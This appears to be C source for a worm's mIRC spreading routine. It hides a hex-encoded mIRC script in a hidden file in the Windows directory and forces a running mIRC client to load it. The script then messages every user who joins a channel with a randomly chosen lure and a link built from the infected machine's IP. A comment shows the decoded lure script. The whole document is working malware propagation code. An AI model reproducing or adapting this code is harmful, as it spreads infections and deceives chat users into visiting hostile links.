bool MircSpread(void)
{
	HWND	WindowHandle;
	HANDLE	FileMap;
	LPVOID	MircData;
	char	WinDir[MAX_PATH];
	char	ScriptName[] = "\\tamiami.mrc";
	HANDLE	ScriptHandle;
	DWORD	BytesWritten;
	char	IP[100];
	char	URL[MAX_PATH];
	char	MircScript[765] =
	{
		0x6F, 0x6E, 0x20, 0x31, 0x3A, 0x4A, 0x4F, 0x49, 0x4E, 0x3A, 0x23, 0x3A, 0x7B, 0x0D, 0x0A, 0x76, 
		0x61, 0x72, 0x20, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x24, 0x72, 0x61, 0x6E, 0x64, 0x28, 0x31, 0x2C, 
		0x20, 0x39, 0x29, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x31, 0x29, 
		0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x65, 0x79, 0x20, 
		0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x2C, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x6F, 0x75, 
		0x74, 0x20, 0x6D, 0x79, 0x20, 0x6C, 0x69, 0x6C, 0x27, 0x20, 0x73, 0x69, 0x74, 0x65, 0x20, 0x3A, 
		0x44, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x32, 
		0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x68, 0x65, 
		0x6C, 0x6C, 0x6F, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x2E, 0x2E, 0x2E, 0x20, 0x69, 0x20, 
		0x68, 0x61, 0x76, 0x65, 0x20, 0x64, 0x6F, 0x6E, 0x65, 0x20, 0x61, 0x20, 0x6C, 0x69, 0x74, 0x74, 
		0x6C, 0x65, 0x20, 0x77, 0x65, 0x62, 0x70, 0x61, 0x67, 0x65, 0x2C, 0x20, 0x63, 0x68, 0x65, 0x63, 
		0x6B, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x6F, 0x75, 0x74, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 
		0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x33, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 
		0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x68, 0x69, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 
		0x21, 0x20, 0x50, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x20, 0x76, 0x69, 0x73, 0x69, 0x74, 0x20, 0x6D, 
		0x79, 0x20, 0x73, 0x69, 0x74, 0x65, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x73, 0x61, 0x79, 0x20, 0x77, 
		0x68, 0x61, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x6B, 0x20, 0x61, 0x62, 
		0x6F, 0x75, 0x74, 0x20, 0x6D, 0x79, 0x20, 0x70, 0x69, 0x63, 0x74, 0x75, 0x72, 0x65, 0x73, 0x3A, 
		0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x34, 0x29, 
		0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x61, 0x68, 0x6F, 
		0x79, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x21, 0x21, 0x21, 0x20, 0x63, 0x68, 0x65, 0x63, 
		0x6B, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x75, 0x72, 0x67, 0x65, 0x6E, 0x74, 0x21, 0x21, 0x21, 
		0x21, 0x21, 0x21, 0x20, 0x69, 0x74, 0x73, 0x20, 0x73, 0x6F, 0x20, 0x63, 0x6F, 0x6F, 0x6C, 0x2E, 
		0x2E, 0x2E, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 
		0x35, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x6F, 
		0x79, 0x20, 0x6F, 0x79, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x2C, 0x20, 0x6D, 0x79, 0x20, 
		0x73, 0x77, 0x65, 0x65, 0x74, 0x20, 0x73, 0x69, 0x74, 0x65, 0x20, 0x3B, 0x44, 0x20, 0x63, 0x68, 
		0x65, 0x63, 0x6B, 0x3A, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 
		0x3D, 0x20, 0x36, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 
		0x20, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x2C, 0x20, 
		0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x77, 0x68, 0x61, 0x74, 0x20, 0x73, 0x74, 0x75, 0x70, 0x69, 
		0x64, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x69, 0x27, 0x76, 0x65, 0x20, 0x66, 0x6F, 0x75, 0x6E, 
		0x64, 0x3A, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 
		0x37, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x77, 
		0x68, 0x61, 0x74, 0x20, 0x61, 0x20, 0x73, 0x74, 0x75, 0x70, 0x69, 0x64, 0x20, 0x73, 0x69, 0x74, 
		0x65, 0x2C, 0x20, 0x63, 0x68, 0x65, 0x63, 0x6B, 0x20, 0x69, 0x74, 0x20, 0x6F, 0x75, 0x74, 0x20, 
		0x24, 0x6E, 0x69, 0x63, 0x6B, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 
		0x20, 0x3D, 0x20, 0x38, 0x29, 0x20, 0x7B, 0x0D, 0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 
		0x3D, 0x20, 0x68, 0x61, 0x68, 0x61, 0x68, 0x61, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x2C, 
		0x20, 0x6E, 0x69, 0x63, 0x65, 0x20, 0x70, 0x69, 0x63, 0x74, 0x75, 0x72, 0x65, 0x73, 0x20, 0x6F, 
		0x66, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x62, 0x69, 0x61, 0x74, 0x63, 0x68, 0x0D, 0x0A, 0x7D, 
		0x0D, 0x0A, 0x69, 0x66, 0x20, 0x28, 0x25, 0x72, 0x20, 0x3D, 0x20, 0x39, 0x29, 0x20, 0x7B, 0x0D, 
		0x0A, 0x76, 0x61, 0x72, 0x20, 0x25, 0x6D, 0x20, 0x3D, 0x20, 0x68, 0x6D, 0x3F, 0x20, 0x69, 0x73, 
		0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x73, 0x69, 0x74, 0x65, 0x20, 
		0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x3F, 0x3F, 0x3F, 0x0D, 0x0A, 0x7D, 0x0D, 0x0A, 0x69, 0x66, 
		0x20, 0x28, 0x24, 0x6D, 0x65, 0x20, 0x21, 0x3D, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x29, 0x20, 
		0x7B, 0x0D, 0x0A, 0x2F, 0x6D, 0x73, 0x67, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 0x25, 0x6D, 
		0x0D, 0x0A, 0x2F, 0x6D, 0x73, 0x67, 0x20, 0x24, 0x6E, 0x69, 0x63, 0x6B, 0x20, 
	};

	WindowHandle = FindWindow("mIRC", 0);

	if(WindowHandle != 0)
	{
		FileMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_READWRITE, 0, 4096, "mIRC");

		if(FileMap != 0)
		{
			MircData = MapViewOfFile(FileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

			if(MircData != 0)
			{
				GetWindowsDirectory(WinDir, sizeof(WinDir));
				lstrcat(WinDir, ScriptName);

				ScriptHandle = CreateFile(WinDir, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

				if(ScriptHandle != INVALID_HANDLE_VALUE)
				{
					WriteFile(ScriptHandle, MircScript, sizeof(MircScript), &BytesWritten, 0);

					if(GetIP(IP) == true)
					{
						AbuseUrl(IP, URL);
						WriteFile(ScriptHandle, URL, lstrlen(URL), &BytesWritten, 0);

						WriteFile(ScriptHandle, "\r\n}\r\n}\r\non 1:EXIT:/unload -rs ", 30, &BytesWritten, 0);
						WriteFile(ScriptHandle, WinDir, lstrlen(WinDir), &BytesWritten, 0);

						lstrcpy((char *)MircData, "/load -rs ");
						lstrcat((char *)MircData, WinDir);
						SendMessage(WindowHandle, WM_USER + 200, 1, 0);
					}

					CloseHandle(ScriptHandle);
					CloseHandle(FileMap);
					
					return true;
				}
			}
		}

	}

	return false;
}

/*
on 1:JOIN:#:{
var %r = $rand(1, 9)
if (%r = 1) {
var %m = ey $nick , check out my lil' site :D
}
if (%r = 2) {
var %m = hello $nick ... i have done a little webpage, check this out
}
if (%r = 3) {
var %m = hi $nick ! Please visit my site and say what you think about my pictures:
}
if (%r = 4) {
var %m = ahoy $nick !!! check this urgent!!!!!! its so cool...
}
if (%r = 5) {
var %m = oy oy $nick , my sweet site ;D check:
}
if (%r = 6) {
var %m = hahaha $nick , check what stupid page i've found:
}
if (%r = 7) {
var %m = what a stupid site, check it out $nick
}
if (%r = 8) {
var %m = hahaha $nick , nice pictures of that biatch
}
if (%r = 9) {
var %m = hm? is this your site $nick ???
}
if ($me != $nick) {
/msg $nick %m
/msg $nick 
*/